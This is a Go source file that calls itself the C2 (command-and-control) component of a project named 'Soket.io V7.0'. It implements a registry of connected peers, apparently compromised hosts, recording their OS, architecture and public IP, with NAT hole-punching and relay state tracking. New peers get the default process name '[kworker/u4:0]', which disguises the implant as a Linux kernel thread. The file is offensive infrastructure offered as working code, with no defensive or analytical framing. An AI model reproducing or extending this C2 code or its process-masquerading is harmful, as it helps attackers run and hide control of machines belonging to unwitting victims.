// Project: Soket.io V7.0
// Module: C2 Component
// Description:  C2 Infrastructure component.


package peer

import (
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/soket-io/gs-oyen-r/internal/protocol"
)

type PeerState int

const (
	PeerStateDisconnected PeerState = iota
	PeerStateHandshaking
	PeerStateAuthenticated
	PeerStateP2PGathering
	PeerStateP2PChecking
	PeerStateP2PConnected
	PeerStateRelayActive
	PeerStateFailed
)

func (s PeerState) String() string {
	switch s {
	case PeerStateDisconnected:
		return "DISCONNECTED"
	case PeerStateHandshaking:
		return "HANDSHAKING"
	case PeerStateAuthenticated:
		return "AUTHENTICATED"
	case PeerStateP2PGathering:
		return "P2P_GATHERING"
	case PeerStateP2PChecking:
		return "P2P_CHECKING"
	case PeerStateP2PConnected:
		return "P2P_CONNECTED"
	case PeerStateRelayActive:
		return "RELAY_ACTIVE"
	case PeerStateFailed:
		return "FAILED"
	default:
		return "UNKNOWN"
	}
}

type PeerInfo struct {
	Mu sync.RWMutex

	PeerID       string
	ProcessName  string
	RemoteAddr   string
	OS           string
	Arch         string
	ConnectedAt  time.Time
	LastActivity time.Time

	State       PeerState
	Session     *protocol.Session
	Connection  net.Conn

	P2PCandidates    []protocol.P2PCandidate
	RemoteCandidates []protocol.P2PCandidate
	P2PCheckPairs    []protocol.P2PCheckPair
	P2PBestCandidate *protocol.P2PCandidate

	BytesReceived uint64
	BytesSent     uint64
	MessagesCount uint64
	ErrorsCount   uint64

	UserAgent   string
	NATType     string
	PublicIP    string
	LastHolePunch time.Time
}


type Registry struct {
	Mu    sync.RWMutex
	peers map[string]*PeerInfo
}


func NewRegistry() *Registry {
	return &Registry{
		peers: make(map[string]*PeerInfo),
	}
}

func (r *Registry) AddPeer(peerID string, conn net.Conn) (*PeerInfo, error) {
	r.Mu.Lock()
	defer r.Mu.Unlock()

	if _, exists := r.peers[peerID]; exists {
		return nil, fmt.Errorf("peer %s already exists", peerID)
	}

	session, err := protocol.NewSession(peerID)
	if err != nil {
		return nil, fmt.Errorf("failed to create session: %w", err)
	}

	peer := &PeerInfo{
		PeerID:       peerID,
		ProcessName:  "[kworker/u4:0]",
		RemoteAddr:   conn.RemoteAddr().String(),
		ConnectedAt:  time.Now(),
		LastActivity: time.Now(),
		State:        PeerStateHandshaking,
		Session:      session,
		Connection:   conn,
	}

	r.peers[peerID] = peer
	return peer, nil
}

func (r *Registry) RemovePeer(peerID string) error {
	r.Mu.Lock()
	defer r.Mu.Unlock()

	peer, exists := r.peers[peerID]
	if !exists {
		return fmt.Errorf("peer %s not found", peerID)
	}

	if peer.Connection != nil {
		peer.Connection.Close()
	}

	delete(r.peers, peerID)
	return nil
}

func (r *Registry) GetPeer(peerID string) (*PeerInfo, error) {
	r.Mu.RLock()
	defer r.Mu.RUnlock()

	peer, exists := r.peers[peerID]
	if !exists {
		return nil, fmt.Errorf("peer %s not found", peerID)
	}

	return peer, nil
}

func (r *Registry) UpdatePeerState(peerID string, state PeerState) error {
	peer, err := r.GetPeer(peerID)
	if err != nil {
		return err
	}

	peer.Mu.Lock()
	defer peer.Mu.Unlock()

	peer.State = state
	peer.LastActivity = time.Now()

	return nil
}

func (r *Registry) UpdateProcessName(peerID, processName string) error {
	peer, err := r.GetPeer(peerID)
	if err != nil {
		return err
	}

	peer.Mu.Lock()
	defer peer.Mu.Unlock()

	peer.ProcessName = processName
	return nil
}

func (r *Registry) AddP2PCandidate(peerID string, candidate protocol.P2PCandidate) error {
	peer, err := r.GetPeer(peerID)
	if err != nil {
		return err
	}

	peer.Mu.Lock()
	defer peer.Mu.Unlock()

	peer.P2PCandidates = append(peer.P2PCandidates, candidate)
	peer.LastActivity = time.Now()

	return nil
}

func (r *Registry) GetActivePeers() []*PeerInfo {
	r.Mu.RLock()
	defer r.Mu.RUnlock()

	var active []*PeerInfo
	for _, p := range r.peers {
		p.Mu.RLock()
		if p.State != PeerStateDisconnected && p.State != PeerStateFailed {
			active = append(active, p)
		}
		p.Mu.RUnlock()
	}
	return active
}

func (r *Registry) GetAllPeers() map[string]*PeerInfo {
	r.Mu.RLock()
	defer r.Mu.RUnlock()

	peers := make(map[string]*PeerInfo)
	for k, v := range r.peers {
		peers[k] = v
	}
	return peers
}

func (r *Registry) GetPeerCount() int {
	r.Mu.RLock()
	defer r.Mu.RUnlock()
	return len(r.peers)
}

func (r *Registry) GetStats() map[string]interface{} {
	r.Mu.RLock()
	defer r.Mu.RUnlock()

	stats := map[string]interface{}{
		"total_peers": len(r.peers),
		"active_peers": 0,
		"p2p_connected": 0,
		"relay_active": 0,
	}

	for _, peer := range r.peers {
		peer.Mu.RLock()
		switch peer.State {
		case PeerStateP2PConnected:
			stats["p2p_connected"] = stats["p2p_connected"].(int) + 1
			stats["active_peers"] = stats["active_peers"].(int) + 1
		case PeerStateRelayActive:
			stats["relay_active"] = stats["relay_active"].(int) + 1
			stats["active_peers"] = stats["active_peers"].(int) + 1
		case PeerStateHandshaking, PeerStateAuthenticated, PeerStateP2PGathering, PeerStateP2PChecking:
			stats["active_peers"] = stats["active_peers"].(int) + 1
		}
		peer.Mu.RUnlock()
	}

	return stats
}

func (r *Registry) CleanupInactivePeers(timeout time.Duration) int {
	r.Mu.Lock()
	defer r.Mu.Unlock()

	now := time.Now()
	cleaned := 0

	for peerID, peer := range r.peers {
		peer.Mu.RLock()
		lastActivity := peer.LastActivity
		peer.Mu.RUnlock()

		if now.Sub(lastActivity) > timeout {
			if peer.Connection != nil {
				peer.Connection.Close()
			}
			delete(r.peers, peerID)
			cleaned++
		}
	}

	return cleaned
}

func (r *Registry) ListPeers() []string {
	r.Mu.RLock()
	defer r.Mu.RUnlock()

	peerIDs := make([]string, 0, len(r.peers))
	for peerID := range r.peers {
		peerIDs = append(peerIDs, peerID)
	}

	return peerIDs
}
